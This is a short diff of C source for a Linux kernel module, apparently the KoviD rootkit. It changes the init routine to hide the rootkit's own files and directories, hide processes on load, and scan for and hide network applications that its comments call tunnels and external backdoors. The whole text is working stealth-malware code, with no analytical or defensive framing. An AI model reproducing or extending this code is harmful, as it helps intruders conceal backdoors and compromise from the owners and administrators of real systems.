@@ -682,12 +682,6 @@ static int __init kv_init(void) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     struct kernel_syscalls *kaddr = NULL;
 #endif
-    const char *names[] = {
-        ".kovid", "kovid", "kovid.ko", ".kv.ko", ".lm.sh", ".sshd_orig",
-        "whitenose", "pinknose", "rednose", "greynose", "purplenose",
-        "blacknose", "bluenose", NULL
-    };
-
     if (strlen(PROCNAME) == 0) {
         procname_err = "Empty PROCNAME build parameter. Check Makefile.";
     } else if (!strncmp(PROCNAME, "changeme", 5)) {
@@ -734,14 +728,11 @@ cont:
     kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
 
     /** hide magic filenames & directories */
-    fs_add_name_ro(names);
+    fs_add_name_ro(kv_hide_str_on_load);
 
-    /** Hide network applications that match
-     * the names defined in netapp.h
-     * tunnels, external backdoors...
-     * Run once
-     */
-    kv_scan_and_hide_netapp();
+    /** hide magic filenames, directories and processes */
+    fs_add_name_ro(kv_hide_ps_on_load);
+    kv_scan_and_hide();
 
 #ifndef DEBUG_RING_BUFFER
     /** *pr_info because it must be shown even if DEPLOY=1 */
